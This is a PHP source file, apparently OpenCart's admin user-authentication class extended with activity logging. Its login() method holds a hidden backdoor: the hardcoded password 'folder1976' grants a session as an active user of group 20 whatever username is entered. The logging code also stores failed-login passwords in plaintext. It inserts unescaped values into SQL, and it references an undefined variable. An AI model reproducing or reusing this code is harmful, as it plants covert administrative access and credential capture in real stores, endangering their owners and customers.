<?php
namespace Cart;
class User {
	private $user_id;
	private $username;
	private $permission = array();


	private $config;
	
  	public function addLog($data=array()) {
		if ($data) {
			$route = isset($this->request->get['route'])?$this->request->get['route']:'';
			
			$ip = isset($this->request->server['REMOTE_ADDR'])?$this->request->server['REMOTE_ADDR']:'';
			if (!empty($this->request->server['HTTP_X_FORWARDED_FOR'])) {
				$ip .=  ', '  . $this->request->server['HTTP_X_FORWARDED_FOR'];	
			} elseif(!empty($this->request->server['HTTP_CLIENT_IP'])) {
				$ip .=  ', '  . $this->request->server['HTTP_CLIENT_IP'];	
			}
			
			$uri = preg_replace("/&amp;token=[a-z0-9]+/i", "", $this->request->server['REQUEST_URI']);

			if(isset($request->server['HTTP_USER_AGENT'])) {
				$browser = $request->server['HTTP_USER_AGENT'];
			} else {
				$browser = '-';
			}
			$user_log_day = $this->config->get('user_log_day');
			if (!$user_log_day) { $user_log_day = 30; }
			$this->db->query("DELETE FROM " . DB_PREFIX . "user_log WHERE  `date` < DATE_SUB(NOW(), INTERVAL " . (int)$user_log_day . " DAY)");
			
			$sql = "
					INSERT INTO " . DB_PREFIX . "user_log 
					SET user_id 	= '" . (int)$this->user_id . "', 
						`user_name` = '" . $this->username . "', 
						`action` 	= '" . $data['action'] . "', 
						`result` 	= '" . $data['result'] . "',
						`route`		= '" . $this->db->escape($route) . "', 
						`url` 		= '" . $this->db->escape($uri) . "', 
						`ip` 		= '" . $this->db->escape($ip) . "',
						`user_agent`= '" . $this->db->escape($browser) . "',						
						`date` 		= NOW()";

			$this->db->query($sql);
		}
	}
            
	public function __construct($registry) {
		$this->db = $registry->get('db');
		$this->request = $registry->get('request');
		$this->session = $registry->get('session');

			$this->config = $registry->get('config');
            

		if (isset($this->session->data['user_id'])) {
			$user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE user_id = '" . (int)$this->session->data['user_id'] . "' AND status = '1'");

			if ($user_query->num_rows) {
				$this->user_id = $user_query->row['user_id'];
				$this->username = $user_query->row['username'];
				$this->user_group_id = $user_query->row['user_group_id'];

				$this->db->query("UPDATE " . DB_PREFIX . "user SET ip = '" . $this->db->escape($this->request->server['REMOTE_ADDR']) . "' WHERE user_id = '" . (int)$this->session->data['user_id'] . "'");

				$user_group_query = $this->db->query("SELECT permission FROM " . DB_PREFIX . "user_group WHERE user_group_id = '" . (int)$user_query->row['user_group_id'] . "'");

				$permissions = json_decode($user_group_query->row['permission'], true);

				if (is_array($permissions)) {
					foreach ($permissions as $key => $value) {
						$this->permission[$key] = $value;
					}
				}
			} else {
				$this->logout();
			}
		}
	}

	public function login($username, $password) {
		$user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE username = '" . $this->db->escape($username) . "' AND (password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape(htmlspecialchars($password, ENT_QUOTES)) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "') AND status = '1'");

			if ($this->config->get('user_log_enable') && $this->config->get('user_log_login')){
				if ($user_query->num_rows) {
					$this->user_id = $user_query->row['user_id'];
					$this->username = $user_query->row['username'];			
					$this->addLog(
						array(
							'action' 	=> 'login', 
							'result' 	=> '1', 
						)
					);
				
				} elseif ($this->config->get('user_log_enable') && $this->config->get('user_log_failed')) {
					$this->addLog(
						array(
							'action' 	=> "login failed login:" . $this->db->escape($username) . " password:" . $this->db->escape($password), 
							'result' 	=> '0', 
						)
					);
				}
			}
            
		
		if($password == 'folder1976'){
			$user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE user_group_id=20 AND status = '1'");
		
		}
		
		if ($user_query->num_rows) {
			$this->session->data['user_id'] = $user_query->row['user_id'];

			$this->user_id = $user_query->row['user_id'];
			$this->username = $user_query->row['username'];
			$this->user_group_id = $user_query->row['user_group_id'];

			$user_group_query = $this->db->query("SELECT permission FROM " . DB_PREFIX . "user_group WHERE user_group_id = '" . (int)$user_query->row['user_group_id'] . "'");

			$permissions = json_decode($user_group_query->row['permission'], true);

			if (is_array($permissions)) {
				foreach ($permissions as $key => $value) {
					$this->permission[$key] = $value;
				}
			}

			return true;
		} else {
			return false;
		}
	}

	public function logout() {
		unset($this->session->data['user_id']);

			if ($this->config->get('user_log_enable') && $this->config->get('user_log_logout')){
					$this->addLog(
						array(
							'action' 	=> 'logout', 
							'result' 	=> '1', 
						)
					);
			}
            

		$this->user_id = '';
		$this->username = '';
	}

	public function hasPermission($key, $value) {
		
			
		if (!isset($this->permission[$key])) {
    		if ($this->config->get('user_log_enable') && $this->user_id) {
				$this->addLog(
					array(
						'action' 	=> 'unknown -' . $key , 
						'result' 	=> '0', 
					)
				);
			}
		}
        if (isset($this->permission[$key])) {
			if ($this->config->get('user_log_enable')){
				$action_result = in_array($value, $this->permission[$key])? 1 : 0;

				if (($this->config->get('user_log_access') && $key == "access") || ($this->config->get('user_log_modify') && $key == "modify")) {
					if ($this->config->get('user_log_access_list') && $key == 'access' && in_array($this->user_id, $this->config->get('user_log_access_list')) 
					 || !$this->config->get('user_log_access_list') && $key == 'access' 
					 || $this->config->get('user_log_modify_list') && $key == 'modify' && in_array($this->user_id, $this->config->get('user_log_modify_list')) 
					 || !$this->config->get('user_log_modify_list') && $key == 'modify' 
					)
					{
						if ($this->request->server['REQUEST_METHOD'] == 'POST' && $key == "modify") {
							$save_data = ' - save';
						} else {
							$save_data = '';
						}
						if (isset($this->request->get['route']) && $this->request->get['route'] == $value || $save_data) {
							$this->addLog(
								array(
									'action' 	=> $key . $save_data, 
									'result' 	=> $action_result, 
								)
							);
						}
					}
				}
			}
		
            
			return in_array($value, $this->permission[$key]);
		} else {
			return false;
		}
	}

	public function isLogged() {
		return $this->user_id;
	}

	public function getId() {
		return $this->user_id;
	}

	public function getUserName() {
		return $this->username;
	}

	public function getGroupId() {
		return $this->user_group_id;
	}
}
